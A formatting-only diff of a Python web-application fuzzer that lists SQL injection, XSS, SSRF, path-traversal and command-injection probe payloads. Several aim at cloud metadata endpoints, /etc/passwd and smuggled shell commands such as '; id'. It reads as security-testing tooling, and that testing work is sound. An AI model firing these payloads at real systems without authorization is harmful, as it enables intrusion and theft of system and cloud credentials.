@@ -20,6 +20,7 @@ logger = logging.getLogger(__name__)
 
 class ParamType(Enum):
     """Detected parameter types."""
+
     NUMERIC = "numeric"
     STRING = "string"
     EMAIL = "email"
@@ -33,6 +34,7 @@ class ParamType(Enum):
 
 class VulnCategory(Enum):
     """Vulnerability categories for fuzzing."""
+
     SQLI = "sql_injection"
     XSS = "xss"
     SSRF = "ssrf"
@@ -47,6 +49,7 @@ class VulnCategory(Enum):
 @dataclass
 class FuzzPayload:
     """A fuzzing payload with metadata."""
+
     payload: str
     category: VulnCategory
     description: str
@@ -57,6 +60,7 @@ class FuzzPayload:
 @dataclass
 class FuzzResult:
     """Result of a fuzzing attempt."""
+
     payload: FuzzPayload
     success: bool
     response_code: int = 0
@@ -68,7 +72,7 @@ class FuzzResult:
 class SmartFuzzer:
     """
     Intelligent fuzzing engine with context-aware payloads.
-    
+
     Features:
     - Detects parameter type automatically
     - Selects appropriate payloads
@@ -101,12 +105,20 @@ class SmartFuzzer:
 
         # SQL Injection payloads
         self._payloads[VulnCategory.SQLI] = [
-            FuzzPayload("'", VulnCategory.SQLI, "Single quote test", r"(sql|syntax|error|mysql|postgres|oracle)", 3),
+            FuzzPayload(
+                "'",
+                VulnCategory.SQLI,
+                "Single quote test",
+                r"(sql|syntax|error|mysql|postgres|oracle)",
+                3,
+            ),
             FuzzPayload("' OR '1'='1", VulnCategory.SQLI, "Classic OR bypass", None, 5),
             FuzzPayload("' OR 1=1--", VulnCategory.SQLI, "Comment bypass", None, 5),
             FuzzPayload("' UNION SELECT NULL--", VulnCategory.SQLI, "UNION test", None, 6),
             FuzzPayload("1' AND SLEEP(5)--", VulnCategory.SQLI, "Time-based blind", None, 7),
-            FuzzPayload("1; WAITFOR DELAY '0:0:5'--", VulnCategory.SQLI, "MSSQL time-based", None, 7),
+            FuzzPayload(
+                "1; WAITFOR DELAY '0:0:5'--", VulnCategory.SQLI, "MSSQL time-based", None, 7
+            ),
             FuzzPayload("' AND '1'='1", VulnCategory.SQLI, "Boolean-based", None, 5),
             FuzzPayload("admin'--", VulnCategory.SQLI, "Comment injection", None, 4),
             FuzzPayload("1' ORDER BY 10--", VulnCategory.SQLI, "Column enumeration", None, 5),
@@ -114,14 +126,34 @@ class SmartFuzzer:
 
         # XSS payloads
         self._payloads[VulnCategory.XSS] = [
-            FuzzPayload("<script>alert(1)</script>", VulnCategory.XSS, "Basic script", r"<script>alert\(1\)</script>", 5),
-            FuzzPayload("<img src=x onerror=alert(1)>", VulnCategory.XSS, "IMG onerror", r"<img[^>]+onerror", 5),
-            FuzzPayload("<svg onload=alert(1)>", VulnCategory.XSS, "SVG onload", r"<svg[^>]+onload", 5),
-            FuzzPayload("javascript:alert(1)", VulnCategory.XSS, "Javascript protocol", r"javascript:", 4),
+            FuzzPayload(
+                "<script>alert(1)</script>",
+                VulnCategory.XSS,
+                "Basic script",
+                r"<script>alert\(1\)</script>",
+                5,
+            ),
+            FuzzPayload(
+                "<img src=x onerror=alert(1)>",
+                VulnCategory.XSS,
+                "IMG onerror",
+                r"<img[^>]+onerror",
+                5,
+            ),
+            FuzzPayload(
+                "<svg onload=alert(1)>", VulnCategory.XSS, "SVG onload", r"<svg[^>]+onload", 5
+            ),
+            FuzzPayload(
+                "javascript:alert(1)", VulnCategory.XSS, "Javascript protocol", r"javascript:", 4
+            ),
             FuzzPayload("'-alert(1)-'", VulnCategory.XSS, "DOM XSS", None, 6),
-            FuzzPayload("<body onload=alert(1)>", VulnCategory.XSS, "Body onload", r"<body[^>]+onload", 5),
+            FuzzPayload(
+                "<body onload=alert(1)>", VulnCategory.XSS, "Body onload", r"<body[^>]+onload", 5
+            ),
             FuzzPayload("{{7*7}}", VulnCategory.XSS, "Template injection test", r"49", 4),
-            FuzzPayload("<iframe src=javascript:alert(1)>", VulnCategory.XSS, "Iframe injection", None, 5),
+            FuzzPayload(
+                "<iframe src=javascript:alert(1)>", VulnCategory.XSS, "Iframe injection", None, 5
+            ),
         ]
 
         # SSRF payloads
@@ -129,20 +161,48 @@ class SmartFuzzer:
             FuzzPayload("http://127.0.0.1", VulnCategory.SSRF, "Localhost", None, 5),
             FuzzPayload("http://localhost", VulnCategory.SSRF, "Localhost name", None, 5),
             FuzzPayload("http://[::1]", VulnCategory.SSRF, "IPv6 localhost", None, 6),
-            FuzzPayload("http://169.254.169.254", VulnCategory.SSRF, "AWS metadata", r"ami-id|instance-id", 8),
-            FuzzPayload("http://metadata.google.internal", VulnCategory.SSRF, "GCP metadata", None, 8),
-            FuzzPayload("file:///etc/passwd", VulnCategory.SSRF, "File protocol", r"root:.*:0:0", 9),
+            FuzzPayload(
+                "http://169.254.169.254",
+                VulnCategory.SSRF,
+                "AWS metadata",
+                r"ami-id|instance-id",
+                8,
+            ),
+            FuzzPayload(
+                "http://metadata.google.internal", VulnCategory.SSRF, "GCP metadata", None, 8
+            ),
+            FuzzPayload(
+                "file:///etc/passwd", VulnCategory.SSRF, "File protocol", r"root:.*:0:0", 9
+            ),
             FuzzPayload("http://0.0.0.0:80", VulnCategory.SSRF, "All interfaces", None, 5),
             FuzzPayload("http://127.0.0.1:22", VulnCategory.SSRF, "Port scan", r"SSH", 6),
         ]
 
         # Path Traversal payloads
         self._payloads[VulnCategory.PATH_TRAVERSAL] = [
-            FuzzPayload("../../../etc/passwd", VulnCategory.PATH_TRAVERSAL, "Basic traversal", r"root:", 7),
-            FuzzPayload("....//....//....//etc/passwd", VulnCategory.PATH_TRAVERSAL, "Double encoding", r"root:", 7),
-            FuzzPayload("..%2f..%2f..%2fetc/passwd", VulnCategory.PATH_TRAVERSAL, "URL encoded", r"root:", 7),
-            FuzzPayload("/etc/passwd%00.jpg", VulnCategory.PATH_TRAVERSAL, "Null byte", r"root:", 8),
-            FuzzPayload("..\\..\\..\\windows\\win.ini", VulnCategory.PATH_TRAVERSAL, "Windows traversal", r"\[fonts\]", 7),
+            FuzzPayload(
+                "../../../etc/passwd", VulnCategory.PATH_TRAVERSAL, "Basic traversal", r"root:", 7
+            ),
+            FuzzPayload(
+                "....//....//....//etc/passwd",
+                VulnCategory.PATH_TRAVERSAL,
+                "Double encoding",
+                r"root:",
+                7,
+            ),
+            FuzzPayload(
+                "..%2f..%2f..%2fetc/passwd", VulnCategory.PATH_TRAVERSAL, "URL encoded", r"root:", 7
+            ),
+            FuzzPayload(
+                "/etc/passwd%00.jpg", VulnCategory.PATH_TRAVERSAL, "Null byte", r"root:", 8
+            ),
+            FuzzPayload(
+                "..\\..\\..\\windows\\win.ini",
+                VulnCategory.PATH_TRAVERSAL,
+                "Windows traversal",
+                r"\[fonts\]",
+                7,
+            ),
         ]
 
         # Command Injection payloads
@@ -150,9 +210,13 @@ class SmartFuzzer:
             FuzzPayload("; id", VulnCategory.COMMAND_INJECTION, "Semicolon", r"uid=", 8),
             FuzzPayload("| id", VulnCategory.COMMAND_INJECTION, "Pipe", r"uid=", 8),
             FuzzPayload("& id", VulnCategory.COMMAND_INJECTION, "Ampersand", r"uid=", 8),
-            FuzzPayload("$(id)", VulnCategory.COMMAND_INJECTION, "Command substitution", r"uid=", 8),
+            FuzzPayload(
+                "$(id)", VulnCategory.COMMAND_INJECTION, "Command substitution", r"uid=", 8
+            ),
             FuzzPayload("`id`", VulnCategory.COMMAND_INJECTION, "Backticks", r"uid=", 8),
-            FuzzPayload("|| ping -c 3 127.0.0.1", VulnCategory.COMMAND_INJECTION, "Ping test", None, 7),
+            FuzzPayload(
+                "|| ping -c 3 127.0.0.1", VulnCategory.COMMAND_INJECTION, "Ping test", None, 7
+            ),
         ]
 
         # SSTI payloads
@@ -203,10 +267,7 @@ class SmartFuzzer:
         return ParamType.STRING
 
     def get_payloads_for_param(
-        self,
-        param_name: str,
-        param_value: str,
-        categories: list[VulnCategory] | None = None
+        self, param_name: str, param_value: str, categories: list[VulnCategory] | None = None
     ) -> list[FuzzPayload]:
         """Get appropriate payloads for a parameter."""
         param_type = self.detect_param_type(param_name, param_value)
@@ -279,9 +340,7 @@ def get_smart_fuzzer() -> SmartFuzzer:
 
 
 def fuzz_parameter(
-    param_name: str,
-    param_value: str,
-    categories: list[VulnCategory] | None = None
+    param_name: str, param_value: str, categories: list[VulnCategory] | None = None
 ) -> list[FuzzPayload]:
     """Convenience function to get payloads for a parameter."""
     fuzzer = get_smart_fuzzer()
